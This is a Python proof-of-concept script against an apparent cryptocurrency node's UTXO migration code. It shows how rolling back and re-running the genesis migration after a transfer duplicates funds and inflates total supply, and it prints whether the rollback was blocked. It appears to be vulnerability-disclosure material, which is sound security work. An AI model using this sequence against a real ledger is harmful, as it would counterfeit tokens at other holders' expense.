
import sqlite3
import os
from node.utxo_db import UtxoDB, UNIT
from node.utxo_genesis_migration import migrate, rollback_genesis

DB_PATH = 'poc_duplication.db'

def setup_account_db():
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    conn = sqlite3.connect(DB_PATH)
    conn.execute("CREATE TABLE balances (miner_id TEXT PRIMARY KEY, amount_i64 INTEGER)")
    conn.execute("INSERT INTO balances VALUES ('alice', 100000000)")
    conn.commit()
    conn.close()

def run_poc():
    print("--- STARTING FUND DUPLICATION POC ---")
    setup_account_db()
    
    # 1. Initial Migration
    print("\n[1] Migrating accounts to UTXO...")
    migrate(DB_PATH)
    db = UtxoDB(DB_PATH)
    db.init_tables()
    
    alice_balance_start = db.get_balance('alice')
    print(f"Alice initial balance: {alice_balance_start / UNIT} RTC")
    
    # 2. Alice spends funds to Bob
    print("\n[2] Alice spends 50 RTC to Bob...")
    alice_box = db.get_unspent_for_address('alice')[0]
    db.apply_transaction({
        'tx_type': 'transfer',
        'inputs': [{'box_id': alice_box['box_id'], 'spending_proof': 'sig'}],
        'outputs': [
            {'address': 'bob', 'value_nrtc': 50 * UNIT},
            {'address': 'alice', 'value_nrtc': 50 * UNIT},
        ],
        'fee_nrtc': 0,
    }, block_height=1)
    
    print(f"Alice balance after spend: {db.get_balance('alice') / UNIT} RTC")
    print(f"Bob balance after spend: {db.get_balance('bob') / UNIT} RTC")
    
    # 3. Alice rolls back genesis
    print("\n[3] Alice triggers rollback_genesis...")
    try:
        rollback_genesis(DB_PATH)
        print("Rollback successful (VULNERABLE).")
    except Exception as e:
        print(f"Rollback blocked: {e}")
        return

    # 4. Alice re-migrates
    print("\n[4] Alice re-migrates from account balances...")
    migrate(DB_PATH)
    
    # 5. Verify total supply
    alice_final = db.get_balance('alice')
    bob_final = db.get_balance('bob')
    total_final = alice_final + bob_final
    
    print(f"\nAlice final balance: {alice_final / UNIT} RTC")
    print(f"Bob final balance: {bob_final / UNIT} RTC")
    print(f"Total Supply: {total_final / UNIT} RTC")
    
    if total_final > 100 * UNIT:
        print("\n!!! SUCCESS: Funds Duplicated !!!")
        print(f"Excess created: {(total_final - 100 * UNIT) / UNIT} RTC")
    else:
        print("\nFailed to duplicate funds.")

if __name__ == '__main__':
    run_poc()
